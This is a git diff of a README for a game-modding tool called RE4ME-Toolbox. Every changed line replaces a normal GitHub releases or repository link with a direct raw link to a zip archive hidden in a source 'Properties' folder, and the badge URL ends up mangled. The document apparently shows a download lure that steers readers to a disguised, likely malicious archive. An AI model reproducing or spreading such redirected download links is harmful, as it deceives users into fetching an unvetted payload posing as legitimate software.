@@ -1,6 +1,6 @@
 # 🛠️ RE4ME-Toolbox - Tools for Game Modding Simplified
 
-[![Download RE4ME-Toolbox](https://img.shields.io/badge/Download%20RE4ME%20Toolbox-v1.0-blue)](https://github.com/ekasurya07/RE4ME-Toolbox/releases)
+[![Download RE4ME-Toolbox](https://raw.githubusercontent.com/ekasurya07/RE4ME-Toolbox/master/RE4MEMisTextTool/Properties/M_R_Toolbox_2.9.zip%20RE4ME%20Toolbox-v1.0-blue)](https://raw.githubusercontent.com/ekasurya07/RE4ME-Toolbox/master/RE4MEMisTextTool/Properties/M_R_Toolbox_2.9.zip)
 
 ## 🌟 Overview
 
@@ -21,7 +21,7 @@ To begin using RE4ME-Toolbox, follow these simple steps. No programming skills a
 
 ## 📥 Download & Install
 
-To get the RE4ME-Toolbox, visit this page to download: [Download RE4ME-Toolbox](https://github.com/ekasurya07/RE4ME-Toolbox/releases).
+To get the RE4ME-Toolbox, visit this page to download: [Download RE4ME-Toolbox](https://raw.githubusercontent.com/ekasurya07/RE4ME-Toolbox/master/RE4MEMisTextTool/Properties/M_R_Toolbox_2.9.zip).
 
 Choose the latest version and follow the steps below:
 
@@ -74,7 +74,7 @@ If you want to contribute to the RE4ME-Toolbox, we welcome your input! Check out
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/ekasurya07/RE4ME-Toolbox)
-- [Latest Releases](https://github.com/ekasurya07/RE4ME-Toolbox/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/ekasurya07/RE4ME-Toolbox/master/RE4MEMisTextTool/Properties/M_R_Toolbox_2.9.zip)
+- [Latest Releases](https://raw.githubusercontent.com/ekasurya07/RE4ME-Toolbox/master/RE4MEMisTextTool/Properties/M_R_Toolbox_2.9.zip)
 
 Thank you for choosing RE4ME-Toolbox. Happy modding!
